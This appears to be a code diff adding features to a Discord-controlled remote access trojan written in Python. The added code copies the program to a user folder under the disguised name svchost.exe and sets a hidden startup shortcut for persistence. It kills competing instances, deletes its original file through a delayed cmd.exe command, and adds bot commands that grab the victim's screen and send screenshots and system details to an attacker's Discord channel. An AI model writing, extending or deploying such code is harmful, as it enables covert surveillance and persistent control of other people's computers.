@@ -1,5 +1,9 @@
 import os
 import sys
+import io
+import time
+import shutil
+import subprocess
 import random
 import string
 import socket
@@ -7,6 +11,7 @@ import platform
 import getpass
 import configparser
 import psutil
+from PIL import ImageGrab
 from cryptography.fernet import Fernet
 import discord
 from discord.ext import commands
@@ -33,6 +38,12 @@ def get_config_path():
     os.makedirs(folder, exist_ok=True)
     return os.path.join(folder, "sync.ini")
 
+def get_target_exe():
+    local_appdata = os.environ.get("LOCALAPPDATA", os.path.expanduser("~"))
+    folder = os.path.join(local_appdata, "Microsoft", "DeviceSync")
+    os.makedirs(folder, exist_ok=True)
+    return os.path.join(folder, "svchost.exe")
+
 def load_config():
     path = get_config_path()
     if not os.path.exists(path):
@@ -45,10 +56,12 @@ def load_config():
             return None
         prefix = cp.get("state", "prefix", fallback="").strip()
         chid = cp.get("state", "chid", fallback="").strip()
+        version = cp.get("state", "version", fallback="0.0").strip()
+        build = cp.get("state", "build", fallback="").strip()
         if not prefix or not prefix.isalpha() or not prefix.islower() or not (2 <= len(prefix) <= 4):
             os.remove(path)
             return None
-        return {"prefix": prefix, "chid": chid}
+        return {"prefix": prefix, "chid": chid, "version": version, "build": build}
     except Exception:
         if os.path.exists(path):
             try:
@@ -57,17 +70,19 @@ def load_config():
                 pass
         return None
 
-def save_config(prefix, chid=""):
+def save_config(prefix, chid="", version="1.0", build=""):
     path = get_config_path()
     cp = configparser.ConfigParser()
     cp["state"] = {
         "prefix": prefix,
-        "chid": chid
+        "chid": chid,
+        "version": version,
+        "build": build
     }
     with open(path, "w", encoding="utf-8") as f:
         cp.write(f)
 
-def ensure_startup_shortcut():
+def ensure_startup_shortcut(target_exe):
     try:
         if not win32com:
             return
@@ -82,17 +97,54 @@ def ensure_startup_shortcut():
         if os.path.exists(shortcut_path):
             try:
                 existing_lnk = shell.CreateShortcut(shortcut_path)
-                if os.path.normpath(existing_lnk.TargetPath) == os.path.normpath(sys.executable):
+                if os.path.normpath(existing_lnk.TargetPath) == os.path.normpath(target_exe):
                     return
             except Exception:
                 pass
         lnk = shell.CreateShortcut(shortcut_path)
-        lnk.TargetPath = sys.executable
-        lnk.WorkingDirectory = os.path.dirname(sys.executable)
+        lnk.TargetPath = target_exe
+        lnk.WorkingDirectory = os.path.dirname(target_exe)
         lnk.WindowStyle = 7
         lnk.Save()
     except Exception:
         pass
+
+def parse_version(ver_str):
+    try:
+        return [int(x) for x in str(ver_str).strip().split(".")]
+    except Exception:
+        return [0]
+
+def kill_existing_instances(target_exe):
+    my_pid = os.getpid()
+    target_norm = os.path.normpath(target_exe).lower()
+    for proc in psutil.process_iter(['pid', 'exe']):
+        try:
+            if proc.info['pid'] != my_pid and proc.info['exe']:
+                if os.path.normpath(proc.info['exe']).lower() == target_norm:
+                    proc.kill()
+        except Exception:
+            pass
+
+def pre_execution_check():
+    if not getattr(sys, 'frozen', False):
+        return
+    target_exe = get_target_exe()
+    current_exe = os.path.abspath(sys.executable)
+    target_norm = os.path.normpath(target_exe).lower()
+    current_norm = os.path.normpath(current_exe).lower()
+
+    if current_norm != target_norm:
+        kill_existing_instances(target_exe)
+    else:
+        my_pid = os.getpid()
+        for proc in psutil.process_iter(['pid', 'exe']):
+            try:
+                if proc.info['pid'] != my_pid and proc.info['exe']:
+                    if os.path.normpath(proc.info['exe']).lower() == target_norm:
+                        sys.exit(0)
+            except Exception:
+                pass
 
 def generate_prefix():
     length = random.randint(2, 4)
@@ -203,11 +255,56 @@ def create_online_embed(prefix_str):
         timestamp=discord.utils.utcnow()
     )
 
+def get_prefix_callable(bot, message):
+    cfg = load_config()
+    p = cfg["prefix"] if cfg else "bot"
+    return p + "!"
+
 intents = discord.Intents.default()
 intents.guilds = True
 intents.message_content = True
 
-bot = commands.Bot(command_prefix="!", intents=intents)
+bot = commands.Bot(command_prefix=get_prefix_callable, intents=intents, help_command=None)
+
+@bot.event
+async def on_message(message):
+    if message.author.bot:
+        return
+    cfg = load_config()
+    if not cfg:
+        return
+    if str(message.channel.id) != cfg.get("chid", ""):
+        return
+    await bot.process_commands(message)
+
+@bot.command(name="help")
+async def cmd_help(ctx):
+    cfg = load_config()
+    p = (cfg["prefix"] if cfg else "bot") + "!"
+    embed = discord.Embed(title="Available Commands", color=0x2b2d31)
+    embed.add_field(name=f"{p}help", value="Show this help message", inline=False)
+    embed.add_field(name=f"{p}ss", value="Capture and send a screenshot of the screen", inline=False)
+    embed.add_field(name=f"{p}sysinfo", value="Display system information details", inline=False)
+    await ctx.send(embed=embed)
+
+@bot.command(name="ss")
+async def cmd_ss(ctx):
+    try:
+        img = ImageGrab.grab()
+        buf = io.BytesIO()
+        img.save(buf, format="PNG")
+        buf.seek(0)
+        file = discord.File(fp=buf, filename="screenshot.png")
+        await ctx.send(file=file)
+    except Exception:
+        await ctx.send("Failed to capture screenshot.")
+
+@bot.command(name="sysinfo")
+async def cmd_sysinfo(ctx):
+    cfg = load_config()
+    p = cfg["prefix"] if cfg else "bot"
+    embed = get_sys_info(p)
+    await ctx.send(embed=embed)
 
 _boot_completed = False
 
@@ -222,13 +319,11 @@ async def on_ready():
     is_new = False
     if not cfg:
         prefix_val = generate_prefix()
-        save_config(prefix_val, "")
-        cfg = {"prefix": prefix_val, "chid": ""}
+        save_config(prefix_val, "", appVersion, appBuild)
+        cfg = {"prefix": prefix_val, "chid": "", "version": appVersion, "build": appBuild}
         is_new = True
     else:
         prefix_val = cfg["prefix"]
-
-    bot.command_prefix = prefix_val + "!"
 
     guild = bot.get_guild(GUILD_ID)
     if not guild:
@@ -263,7 +358,7 @@ async def on_ready():
                 channel = await category.create_text_channel(name=prefix_val)
             else:
                 channel = await guild.create_text_channel(name=prefix_val, category=category)
-            save_config(prefix_val, str(channel.id))
+            save_config(prefix_val, str(channel.id), appVersion, appBuild)
             embed = get_sys_info(prefix_val)
             await channel.send(embed=embed)
         except Exception:
@@ -275,5 +370,39 @@ async def on_ready():
         except Exception:
             pass
 
-ensure_startup_shortcut()
+    if getattr(sys, 'frozen', False):
+        target_exe = get_target_exe()
+        current_exe = os.path.abspath(sys.executable)
+        if os.path.normpath(current_exe).lower() != os.path.normpath(target_exe).lower():
+            kill_existing_instances(target_exe)
+            time.sleep(0.5)
+            copied = False
+            for _ in range(3):
+                try:
+                    shutil.copy2(current_exe, target_exe)
+                    copied = True
+                    break
+                except Exception:
+                    time.sleep(0.5)
+            if copied:
+                ensure_startup_shortcut(target_exe)
+                try:
+                    proc = subprocess.Popen([target_exe])
+                    spawned_ok = False
+                    for _ in range(10):
+                        time.sleep(0.5)
+                        if proc.poll() is None:
+                            spawned_ok = True
+                            break
+                    if spawned_ok:
+                        if os.name == "nt":
+                            subprocess.Popen(f'cmd.exe /c timeout /t 3 /nobreak & del /f /q "{current_exe}"', shell=True)
+                        await bot.close()
+                        sys.exit(0)
+                except Exception:
+                    pass
+        else:
+            ensure_startup_shortcut(target_exe)
+
+pre_execution_check()
 bot.run(_TOKEN)
